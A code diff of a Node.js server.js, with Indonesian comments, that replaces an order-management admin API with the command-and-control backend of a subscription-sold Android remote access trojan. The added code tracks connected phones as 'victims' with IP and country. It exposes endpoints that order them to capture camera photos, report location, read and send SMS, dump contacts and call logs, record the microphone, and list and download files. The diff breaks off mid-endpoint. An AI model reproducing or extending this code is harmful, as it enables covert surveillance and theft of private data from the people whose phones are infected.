@@ -1,487 +1,816 @@
-// server.js - Backend API untuk Admin Order Management (Anrat Database)
-const express = require('express');
-const mysql = require('mysql2/promise');
-const cors = require('cors');
 require('dotenv').config();
-const https = require('https');
-const http = require('http');
+const express = require('express');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const mysql = require('mysql2/promise');
+const io = require('socket.io');
+const geoip = require('geoip-lite');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const API_PORT = process.env.API_PORT || 3000;
+const RAT_PORT = process.env.RAT_PORT || 42474;
 
 // Middleware
 app.use(cors());
-app.use(express.json());
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
 
-// Database connection pool
-const pool = mysql.createPool({
-    host: process.env.DB_HOST || 'localhost',
-    user: process.env.DB_USER || 'root',
-    password: process.env.DB_PASSWORD || '',
-    database: process.env.DB_NAME || 'anrat',
-    waitForConnections: true,
-    connectionLimit: 10,
-    queueLimit: 0
+// Database Pool
+const db = mysql.createPool({
+  host: process.env.DB_HOST || 'localhost',
+  user: process.env.DB_USER || 'root',
+  password: process.env.DB_PASSWORD || '',
+  database: process.env.DB_NAME || 'anrat',
+  waitForConnections: true,
+  connectionLimit: 10,
+  queueLimit: 0
 });
 
-// Test database connection
-pool.getConnection()
-    .then(connection => {
-        console.log('✅ Database connected successfully');
-        connection.release();
-    })
-    .catch(err => {
-        console.error('❌ Database connection failed:', err);
+// In-memory victims storage
+const victims = {};
+let ratServer = null;
+
+// ========================================
+// DATABASE HELPER FUNCTIONS
+// ========================================
+
+async function getPairingCode(code) {
+  try {
+    const [rows] = await db.execute(
+      `SELECT pc.*, s.type, s.users, s.telegram_id
+       FROM pairing_codes pc 
+       JOIN subscriptions s ON pc.subscription_id = s.id 
+       WHERE pc.pairing_code = ? 
+       AND pc.used = 0 
+       AND pc.expires_at > NOW()`,
+      [code]
+    );
+    return rows[0] || null;
+  } catch (error) {
+    console.error('Error getting pairing code:', error);
+    return null;
+  }
+}
+
+async function usePairingCode(code, deviceId) {
+  try {
+    const [result] = await db.execute(
+      'UPDATE pairing_codes SET used = 1, used_at = NOW(), device_id = ? WHERE pairing_code = ?',
+      [deviceId, code]
+    );
+    return result.affectedRows > 0;
+  } catch (error) {
+    console.error('Error using pairing code:', error);
+    return false;
+  }
+}
+
+async function addDevice(subscriptionId, telegramId, deviceId, deviceName) {
+  try {
+    // Check if device already exists
+    const [existing] = await db.execute(
+      'SELECT * FROM devices WHERE device_id = ?',
+      [deviceId]
+    );
+
+    if (existing.length > 0) {
+      // Update existing device
+      await db.execute(
+        'UPDATE devices SET last_active = NOW(), status = "active" WHERE device_id = ?',
+        [deviceId]
+      );
+      return existing[0].id;
+    } else {
+      // Insert new device
+      const [result] = await db.execute(
+        'INSERT INTO devices (subscription_id, telegram_id, device_id, device_name, last_active) VALUES (?, ?, ?, ?, NOW())',
+        [subscriptionId, telegramId, deviceId, deviceName]
+      );
+      return result.insertId;
+    }
+  } catch (error) {
+    console.error('Error adding device:', error);
+    return null;
+  }
+}
+
+async function getDevice(deviceId) {
+  try {
+    const [rows] = await db.execute(
+      `SELECT d.*, s.type, s.users, u.username, u.telegram_id as owner_telegram_id
+       FROM devices d 
+       JOIN subscriptions s ON d.subscription_id = s.id 
+       JOIN users u ON d.telegram_id = u.telegram_id 
+       WHERE d.device_id = ? AND d.status = 'active'`,
+      [deviceId]
+    );
+    return rows[0] || null;
+  } catch (error) {
+    console.error('Error getting device:', error);
+    return null;
+  }
+}
+
+async function getDevicesByTelegramId(telegramId) {
+  try {
+    const [rows] = await db.execute(
+      `SELECT d.*, s.type 
+       FROM devices d 
+       JOIN subscriptions s ON d.subscription_id = s.id 
+       WHERE d.telegram_id = ? 
+       AND d.status = 'active' 
+       ORDER BY d.last_active DESC`,
+      [telegramId]
+    );
+    return rows;
+  } catch (error) {
+    console.error('Error getting devices:', error);
+    return [];
+  }
+}
+
+async function updateDeviceLastActive(deviceId) {
+  try {
+    await db.execute(
+      'UPDATE devices SET last_active = NOW() WHERE device_id = ?',
+      [deviceId]
+    );
+    return true;
+  } catch (error) {
+    console.error('Error updating device:', error);
+    return false;
+  }
+}
+
+async function verifyDeviceOwnership(deviceId, telegramId) {
+  try {
+    const [rows] = await db.execute(
+      'SELECT * FROM devices WHERE device_id = ? AND telegram_id = ? AND status = "active"',
+      [deviceId, telegramId]
+    );
+    return rows.length > 0;
+  } catch (error) {
+    console.error('Error verifying ownership:', error);
+    return false;
+  }
+}
+
+// ========================================
+// SOCKET.IO RAT SERVER
+// ========================================
+
+function startRATServer(port = RAT_PORT) {
+  if (ratServer) {
+    console.log('⚠️  RAT Server already running');
+    return false;
+  }
+
+  try {
+    ratServer = io.listen(port, {
+      maxHttpBufferSize: 1024 * 1024 * 100,
+      cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
+      }
     });
 
-// ==================== SUBSCRIPTIONS ENDPOINTS ====================
-app.get('/api/telegram/photo/:file_id', async (req, res) => {
-    try {
-        const fileId = req.params.file_id;
-        const BOT_TOKEN = process.env.BOT_TOKEN;
+    ratServer.sockets.pingInterval = 10000;
+    ratServer.sockets.pingTimeout = 10000;
 
-        if (!BOT_TOKEN) {
-            return res.status(500).json({ error: 'BOT_TOKEN not configured' });
-        }
+    ratServer.sockets.on('connection', async (socket) => {
+      const address = socket.request.connection;
+      const query = socket.handshake.query;
+      
+      // Extract device info
+      const deviceId = query.id;
+      const pairingCode = query.pairing_code;
+      const ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
+      
+      let country = null;
+      const geo = geoip.lookup(ip);
+      if (geo) country = geo.country.toLowerCase();
 
-        // Get file path from Telegram
-        const getFileUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`;
-        
-        const fileResponse = await fetch(getFileUrl);
-        const fileData = await fileResponse.json();
+      console.log(`\n🔌 New connection attempt:`);
+      console.log(`   Device ID: ${deviceId}`);
+      console.log(`   Pairing Code: ${pairingCode}`);
+      console.log(`   IP: ${ip}`);
 
-        if (!fileData.ok) {
-            return res.status(400).json({ error: 'Failed to get file from Telegram' });
-        }
+      // Verify pairing code
+      if (!pairingCode) {
+        console.log('   ❌ No pairing code provided');
+        socket.emit('error', { message: 'Pairing code required' });
+        socket.disconnect();
+        return;
+      }
 
-        // Get actual file URL
-        const filePath = fileData.result.file_path;
-        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
+      const pairingData = await getPairingCode(pairingCode);
+      
+      if (!pairingData) {
+        console.log('   ❌ Invalid or expired pairing code');
+        socket.emit('error', { message: 'Invalid or expired pairing code' });
+        socket.disconnect();
+        return;
+      }
 
-        res.json({ 
-            success: true,
-            file_url: fileUrl,
-            file_path: filePath
-        });
+      console.log(`   ✅ Valid pairing code for user: ${pairingData.telegram_id}`);
 
-    } catch (error) {
-        console.error('Error fetching Telegram photo:', error);
-        res.status(500).json({ error: 'Failed to fetch photo from Telegram' });
-    }
-});
+      // Check device limit
+      const existingDevices = await getDevicesByTelegramId(pairingData.telegram_id);
+      const maxDevices = pairingData.users === 0 ? Infinity : parseInt(pairingData.users);
+      
+      if (existingDevices.length >= maxDevices) {
+        console.log(`   ❌ Device limit reached: ${existingDevices.length}/${maxDevices}`);
+        socket.emit('error', { message: 'Device limit reached' });
+        socket.disconnect();
+        return;
+      }
 
-// Endpoint untuk proxy download foto (agar bisa tampil di frontend tanpa CORS issue)
-app.get('/api/telegram/download/:file_id', async (req, res) => {
-    try {
-        const fileId = req.params.file_id;
-        const BOT_TOKEN = process.env.BOT_TOKEN;
+      // Use pairing code and add device
+      await usePairingCode(pairingCode, deviceId);
+      const deviceName = `${query.manf} ${query.model}`;
+      await addDevice(pairingData.subscription_id, pairingData.telegram_id, deviceId, deviceName);
 
-        if (!BOT_TOKEN) {
-            return res.status(500).json({ error: 'BOT_TOKEN not configured' });
-        }
+      console.log(`   ✅ Device paired successfully!`);
 
-        // Get file path from Telegram
-        const getFileUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`;
-        
-        const fileResponse = await fetch(getFileUrl);
-        const fileData = await fileResponse.json();
+      // Store victim data
+      victims[deviceId] = {
+        socket: socket,
+        deviceId: deviceId,
+        ip: ip,
+        port: address.remotePort,
+        country: country,
+        manufacturer: query.manf,
+        model: query.model,
+        release: query.release,
+        telegramId: pairingData.telegram_id,
+        subscriptionId: pairingData.subscription_id,
+        connectedAt: new Date()
+      };
 
-        if (!fileData.ok) {
-            return res.status(400).json({ error: 'Failed to get file from Telegram' });
-        }
+      // Update last active
+      await updateDeviceLastActive(deviceId);
 
-        // Download file from Telegram
-        const filePath = fileData.result.file_path;
-        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
+      // Emit success
+      socket.emit('paired', { 
+        success: true, 
+        message: 'Device paired successfully',
+        deviceId: deviceId 
+      });
 
-        const imageResponse = await fetch(fileUrl);
-        const imageBuffer = await imageResponse.arrayBuffer();
+      // Handle disconnect
+      socket.on('disconnect', async () => {
+        console.log(`\n🔌 Device disconnected: ${deviceId}`);
+        delete victims[deviceId];
+      });
 
-        // Set proper headers
-        res.setHeader('Content-Type', 'image/jpeg');
-        res.setHeader('Cache-Control', 'public, max-age=86400'); // Cache 1 day
-        res.send(Buffer.from(imageBuffer));
+      // Handle commands
+      socket.on('order', (data) => {
+        console.log(`📨 Order received from ${deviceId}:`, data.order);
+      });
+    });
 
-    } catch (error) {
-        console.error('Error downloading Telegram photo:', error);
-        res.status(500).json({ error: 'Failed to download photo' });
-    }
-});
-// GET: Ambil semua subscriptions
-app.get('/api/subscriptions', async (req, res) => {
-    try {
-        const [rows] = await pool.query(`
-            SELECT 
-                s.id,
-                s.telegram_id,
-                s.type,
-                s.users,
-                s.price,
-                s.status,
-                s.payment_info,
-                s.created_at,
-                s.updated_at,
-                u.username,
-                u.phone
-            FROM subscriptions s
-            LEFT JOIN users u ON s.telegram_id = u.telegram_id
-            ORDER BY s.created_at DESC
-        `);
-        res.json(rows);
-    } catch (error) {
-        console.error('Error fetching subscriptions:', error);
-        res.status(500).json({ error: 'Failed to fetch subscriptions' });
-    }
-});
+    console.log(`✅ RAT Server started on port ${port}`);
+    return true;
+  } catch (error) {
+    console.error('❌ Failed to start RAT server:', error);
+    return false;
+  }
+}
 
-// GET: Ambil subscription by ID
-app.get('/api/subscriptions/:id', async (req, res) => {
-    try {
-        const [rows] = await pool.query(`
-            SELECT 
-                s.id,
-                s.telegram_id,
-                s.type,
-                s.users,
-                s.price,
-                s.status,
-                s.payment_info,
-                s.created_at,
-                s.updated_at,
-                u.username,
-                u.phone
-            FROM subscriptions s
-            LEFT JOIN users u ON s.telegram_id = u.telegram_id
-            WHERE s.id = ?
-        `, [req.params.id]);
-        
-        if (rows.length === 0) {
-            return res.status(404).json({ error: 'Subscription not found' });
-        }
-        
-        res.json(rows[0]);
-    } catch (error) {
-        console.error('Error fetching subscription:', error);
-        res.status(500).json({ error: 'Failed to fetch subscription' });
-    }
-});
+function stopRATServer() {
+  if (!ratServer) {
+    return false;
+  }
 
-// GET: Ambil subscriptions by telegram_id
-app.get('/api/subscriptions/user/:telegram_id', async (req, res) => {
-    try {
-        const [rows] = await pool.query(`
-            SELECT 
-                s.id,
-                s.telegram_id,
-                s.type,
-                s.users,
-                s.price,
-                s.status,
-                s.payment_info,
-                s.created_at,
-                s.updated_at
-            FROM subscriptions s
-            WHERE s.telegram_id = ?
-            ORDER BY s.created_at DESC
-        `, [req.params.telegram_id]);
-        
-        res.json(rows);
-    } catch (error) {
-        console.error('Error fetching user subscriptions:', error);
-        res.status(500).json({ error: 'Failed to fetch user subscriptions' });
-    }
-});
+  try {
+    ratServer.close();
+    ratServer = null;
+    
+    // Clear victims
+    Object.keys(victims).forEach(key => delete victims[key]);
+    
+    console.log('✅ RAT Server stopped');
+    return true;
+  } catch (error) {
+    console.error('❌ Failed to stop RAT server:', error);
+    return false;
+  }
+}
 
-// PUT: Approve subscription
-// PUT: Approve subscription - AUTO GENERATE ACTIVATION CODE
-app.put('/api/subscriptions/:id/approve', async (req, res) => {
-    try {
-        function generateActivationCode() {
-            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-            let code = '';
-            for (let i = 0; i < 8; i++) {
-                if (i === 4) code += '-';
-                code += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return code;
-        }
-
-        const activationCode = generateActivationCode();
-
-        const [result] = await pool.query(`
-            UPDATE subscriptions 
-            SET status = 'approved', 
-                activation_code = ?,
-                is_active = 1,
-                updated_at = NOW() 
-            WHERE id = ? AND status = 'pending'
-        `, [activationCode, req.params.id]);
-        
-        if (result.affectedRows === 0) {
-            return res.status(400).json({ error: 'Subscription not found or already processed' });
-        }
-
-        // Get subscription details
-        const [subDetails] = await pool.query(
-            'SELECT * FROM subscriptions WHERE id = ?',
-            [req.params.id]
-        );
-
-        const subscription = subDetails[0];
-
-        // Kirim notifikasi ke user via Telegram
-        try {
-            const message = `
-🎉 *Pembayaran Approved!*
-
-Order ID: ${subscription.id}
-Tipe: ${subscription.type}
-Users: ${subscription.users}
-Harga: Rp${subscription.price.toLocaleString('id-ID')}
-
-🔑 *Kode Aktivasi:* \`${activationCode}\`
-
-Aktivasi sekarang dengan:
-/activate ${activationCode}
-            `;
-
-            await telegramBot.sendMessage(subscription.telegram_id, message, { parse_mode: 'Markdown' });
-        } catch (telegramError) {
-            console.error('Failed to send Telegram notification:', telegramError);
-            // Tetap lanjut meski notif gagal
-        }
-
-        res.json({ 
-            message: 'Subscription approved successfully',
-            id: req.params.id,
-            activation_code: activationCode,
-            subscription: subscription
-        });
-
-    } catch (error) {
-        console.error('Error approving subscription:', error);
-        res.status(500).json({ error: 'Failed to approve subscription' });
-    }
-});
-
-// PUT: Reject subscription
-app.put('/api/subscriptions/:id/reject', async (req, res) => {
-    try {
-        const { reason } = req.body;
-        
-        const [result] = await pool.query(`
-            UPDATE subscriptions 
-            SET status = 'rejected', updated_at = NOW()
-            WHERE id = ? AND status = 'pending'
-        `, [req.params.id]);
-        
-        if (result.affectedRows === 0) {
-            return res.status(400).json({ error: 'Subscription not found or already processed' });
-        }
-        
-        res.json({ 
-            message: 'Subscription rejected successfully',
-            id: req.params.id,
-            reason: reason || 'No reason provided'
-        });
-    } catch (error) {
-        console.error('Error rejecting subscription:', error);
-        res.status(500).json({ error: 'Failed to reject subscription' });
-    }
-});
-
-// DELETE: Hapus subscription
-app.delete('/api/subscriptions/:id', async (req, res) => {
-    try {
-        const [result] = await pool.query('DELETE FROM subscriptions WHERE id = ?', [req.params.id]);
-        
-        if (result.affectedRows === 0) {
-            return res.status(404).json({ error: 'Subscription not found' });
-        }
-        
-        res.json({ message: 'Subscription deleted successfully' });
-    } catch (error) {
-        console.error('Error deleting subscription:', error);
-        res.status(500).json({ error: 'Failed to delete subscription' });
-    }
-});
-
-// ==================== USERS ENDPOINTS ====================
-
-// GET: Ambil semua users
-app.get('/api/users', async (req, res) => {
-    try {
-        const [rows] = await pool.query(`
-            SELECT 
-                id,
-                telegram_id,
-                username,
-                phone,
-                session_token,
-                session_expiry
-            FROM users 
-            ORDER BY id DESC
-        `);
-        res.json(rows);
-    } catch (error) {
-        console.error('Error fetching users:', error);
-        res.status(500).json({ error: 'Failed to fetch users' });
-    }
-});
-
-// GET: Ambil user by telegram_id
-app.get('/api/users/:telegram_id', async (req, res) => {
-    try {
-        const [rows] = await pool.query(`
-            SELECT 
-                id,
-                telegram_id,
-                username,
-                phone,
-                session_token,
-                session_expiry
-            FROM users 
-            WHERE telegram_id = ?
-        `, [req.params.telegram_id]);
-        
-        if (rows.length === 0) {
-            return res.status(404).json({ error: 'User not found' });
-        }
-        
-        res.json(rows[0]);
-    } catch (error) {
-        console.error('Error fetching user:', error);
-        res.status(500).json({ error: 'Failed to fetch user' });
-    }
-});
-
-// ==================== STATISTICS ENDPOINTS ====================
-
-// GET: Statistics
-app.get('/api/stats', async (req, res) => {
-    try {
-        const [stats] = await pool.query(`
-            SELECT 
-                COUNT(*) as total,
-                SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) as pending,
-                SUM(CASE WHEN status = 'approved' THEN 1 ELSE 0 END) as approved,
-                SUM(CASE WHEN status = 'rejected' THEN 1 ELSE 0 END) as rejected,
-                SUM(CASE WHEN status = 'approved' THEN price ELSE 0 END) as total_revenue
-            FROM subscriptions
-        `);
-        
-        const [userCount] = await pool.query('SELECT COUNT(*) as total_users FROM users');
-        
-        res.json({
-            subscriptions: stats[0],
-            users: userCount[0]
-        });
-    } catch (error) {
-        console.error('Error fetching stats:', error);
-        res.status(500).json({ error: 'Failed to fetch statistics' });
-    }
-});
-
-// GET: Revenue by type
-app.get('/api/stats/revenue', async (req, res) => {
-    try {
-        const [rows] = await pool.query(`
-            SELECT 
-                type,
-                COUNT(*) as count,
-                SUM(price) as total_revenue,
-                AVG(price) as avg_price
-            FROM subscriptions
-            WHERE status = 'approved'
-            GROUP BY type
-        `);
-        res.json(rows);
-    } catch (error) {
-        console.error('Error fetching revenue stats:', error);
-        res.status(500).json({ error: 'Failed to fetch revenue statistics' });
-    }
-});
-
-// GET: Daily statistics
-app.get('/api/stats/daily', async (req, res) => {
-    try {
-        const [rows] = await pool.query(`
-            SELECT 
-                DATE(created_at) as date,
-                COUNT(*) as total_orders,
-                SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) as pending,
-                SUM(CASE WHEN status = 'approved' THEN 1 ELSE 0 END) as approved,
-                SUM(CASE WHEN status = 'rejected' THEN 1 ELSE 0 END) as rejected,
-                SUM(CASE WHEN status = 'approved' THEN price ELSE 0 END) as revenue
-            FROM subscriptions
-            WHERE created_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)
-            GROUP BY DATE(created_at)
-            ORDER BY date DESC
-        `);
-        res.json(rows);
-    } catch (error) {
-        console.error('Error fetching daily stats:', error);
-        res.status(500).json({ error: 'Failed to fetch daily statistics' });
-    }
-});
-
-// ==================== UTILITY ENDPOINTS ====================
+// ========================================
+// REST API ENDPOINTS
+// ========================================
 
 // Health check
-app.get('/api/health', async (req, res) => {
-    try {
-        await pool.query('SELECT 1');
-        res.json({ 
-            status: 'OK', 
-            timestamp: new Date(),
-            database: 'connected'
-        });
-    } catch (error) {
-        res.status(500).json({ 
-            status: 'ERROR', 
-            timestamp: new Date(),
-            database: 'disconnected',
-            error: error.message
-        });
+app.get('/api/health', (req, res) => {
+  res.json({ 
+    success: true, 
+    status: 'running', 
+    version: '1.0.0',
+    ratServer: ratServer !== null,
+    connectedDevices: Object.keys(victims).length
+  });
+});
+
+// Get all victims (filtered by telegram_id)
+app.get('/api/victims', async (req, res) => {
+  try {
+    const { telegram_id } = req.query;
+    
+    if (!telegram_id) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'telegram_id required' 
+      });
     }
-});
 
-// Error handler middleware
-app.use((err, req, res, next) => {
-    console.error(err.stack);
-    res.status(500).json({ 
-        error: 'Something went wrong!',
-        message: err.message 
+    // Get user's paired devices
+    const devices = await getDevicesByTelegramId(telegram_id);
+    const deviceIds = devices.map(d => d.device_id);
+
+    // Filter connected victims
+    const userVictims = Object.values(victims)
+      .filter(v => deviceIds.includes(v.deviceId))
+      .map(v => ({
+        deviceId: v.deviceId,
+        ip: v.ip,
+        port: v.port,
+        country: v.country,
+        manufacturer: v.manufacturer,
+        model: v.model,
+        release: v.release,
+        connectedAt: v.connectedAt
+      }));
+
+    res.json({ 
+      success: true, 
+      victims: userVictims,
+      total: userVictims.length
     });
+  } catch (error) {
+    console.error('Error getting victims:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
 });
 
-// 404 handler
-app.use((req, res) => {
-    res.status(404).json({ error: 'Endpoint not found' });
+// Get specific victim
+app.get('/api/victims/:deviceId', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id } = req.query;
+
+    if (!telegram_id) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'telegram_id required' 
+      });
+    }
+
+    // Verify ownership
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ 
+        success: false, 
+        error: 'Access denied' 
+      });
+    }
+
+    const victim = victims[deviceId];
+    
+    if (!victim) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Device not connected' 
+      });
+    }
+
+    res.json({ 
+      success: true, 
+      victim: {
+        deviceId: victim.deviceId,
+        ip: victim.ip,
+        port: victim.port,
+        country: victim.country,
+        manufacturer: victim.manufacturer,
+        model: victim.model,
+        release: victim.release,
+        connectedAt: victim.connectedAt
+      }
+    });
+  } catch (error) {
+    console.error('Error getting victim:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
 });
 
-// Start server
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on http://localhost:${PORT}`);
-    console.log(`📊 API endpoints available at http://localhost:${PORT}/api`);
-    console.log(`💾 Database: ${process.env.DB_NAME || 'anrat'}`);
+// Send command to victim
+app.post('/api/victims/:deviceId/command', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id, order, extra, data } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'telegram_id required' 
+      });
+    }
+
+    // Verify ownership
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ 
+        success: false, 
+        error: 'Access denied' 
+      });
+    }
+
+    const victim = victims[deviceId];
+    
+    if (!victim) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Device not connected' 
+      });
+    }
+
+    if (!order) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Order is required' 
+      });
+    }
+
+    // Send command
+    victim.socket.emit('order', { order, extra, ...data });
+    
+    // Update last active
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'Command sent successfully' });
+  } catch (error) {
+    console.error('Error sending command:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
 });
 
-// Handle graceful shutdown
-process.on('SIGTERM', async () => {
-    console.log('SIGTERM signal received: closing HTTP server');
-    await pool.end();
-    process.exit(0);
+// Camera endpoints
+app.post('/api/victims/:deviceId/camera', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id, cameraId = 0 } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    // Request camera list first
+    victim.socket.emit('order', { order: 'x0000ca', extra: 'camList' });
+    
+    // Wait a bit then take photo
+    setTimeout(() => {
+      victim.socket.emit('order', { order: 'x0000ca', extra: cameraId });
+    }, 1000);
+
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'Camera capture initiated' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
 });
 
-process.on('SIGINT', async () => {
-    console.log('SIGINT signal received: closing HTTP server');
-    await pool.end();
-    process.exit(0);
+// Location endpoint
+app.post('/api/victims/:deviceId/location', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    victim.socket.emit('order', { order: 'x0000lm' });
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'Location request sent' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
 });
 
-// Tambahkan di bagian atas file, setelah require
-const TelegramBot = require('node-telegram-bot-api');
-const telegramBot = new TelegramBot(process.env.BOT_TOKEN);
+// SMS endpoints
+app.post('/api/victims/:deviceId/sms/list', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id } = req.body;
 
-// PUT: Approve subscription - DENGAN NOTIFIKASI TELEGRAM
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    victim.socket.emit('order', { order: 'x0000sm', extra: 'ls' });
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'SMS list request sent' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/victims/:deviceId/sms/send', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id, to, message } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    if (!to || !message) {
+      return res.status(400).json({ success: false, error: 'Phone number and message are required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    victim.socket.emit('order', { 
+      order: 'x0000sm', 
+      extra: 'sendSMS', 
+      to: to, 
+      sms: message 
+    });
+    
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'SMS sent successfully' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Contacts endpoint
+app.post('/api/victims/:deviceId/contacts', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    victim.socket.emit('order', { order: 'x0000cn' });
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'Contacts request sent' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Call logs endpoint
+app.post('/api/victims/:deviceId/calls', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    victim.socket.emit('order', { order: 'x0000cl' });
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'Call logs request sent' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Microphone endpoint
+app.post('/api/victims/:deviceId/microphone', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id, duration = 10 } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    victim.socket.emit('order', { order: 'x0000mc', sec: duration });
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'Microphone recording initiated' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// File manager endpoints
+app.post('/api/victims/:deviceId/files/list', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id, path = '/storage/emulated/0/' } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    victim.socket.emit('order', { 
+      order: 'x0000fm', 
+      extra: 'ls', 
+      path: path 
+    });
+    
+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'File list request sent' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/victims/:deviceId/files/download', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { telegram_id, path } = req.body;
+
+    if (!telegram_id) {
+      return res.status(400).json({ success: false, error: 'telegram_id required' });
+    }
+
+    if (!path) {
+      return res.status(400).json({ success: false, error: 'File path is required' });
+    }
+
+    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
+    if (!isOwner) {
+      return res.status(403).json({ success: false, error: 'Access denied' });
+    }
+
+    const victim = victims[deviceId];
+    if (!victim) {
+      return res.status(404).json({ success: false, error: 'Device not connected' });
+    }
+
+    victim.socket.emit('order', { 
+      order: 'x0000fm', 
+      extra: 'dl', 
+      path: path 
+    });
+    
